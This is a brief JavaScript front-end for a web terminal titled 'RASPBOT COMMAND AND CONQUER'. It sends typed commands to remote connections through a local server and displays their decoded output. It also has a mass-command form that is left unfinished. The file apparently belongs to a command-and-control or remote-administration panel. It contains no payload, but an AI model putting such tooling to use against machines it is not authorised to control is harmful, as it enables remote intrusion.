$(document).ready(() => {
    let socket = io('http://127.0.0.1:8040');
    let $numberOfConnections = $('');
    let senderId = $('#terminal-control').data('connection-id');


    let termMain = $('#terminal-control').terminal(function (cmd, term) {
        $.ajax({
            url: '/control/'+senderId+'/cmd/',
            data: {
                cmd: cmd
            },
            method: 'post'
        })
    }, {
        greetings: 'RASPBOT COMMAND AND CONQUER!',
        name: 'raspbot',
        height: 600,
        prompt: '> '
    });

    socket.on('data', function (data) {
        let packet =JSON.parse(data);
        if(packet.sender_id === senderId){
            termMain.echo(atob(packet.data.output));
        }
    });
    socket.on('delete-connection', function(data){
        let packet =JSON.parse(data);
        if(packet.id === senderId){
            termMain.echo('CONNECTION (' +senderId +') has been aborted! \nNo new data can be send...');
            termMain.pause();
        }
    });

    $('#mass-command').on('submit', function (e) {
        e.preventDefault();
        let formdata = $(this).serialize();
    });
});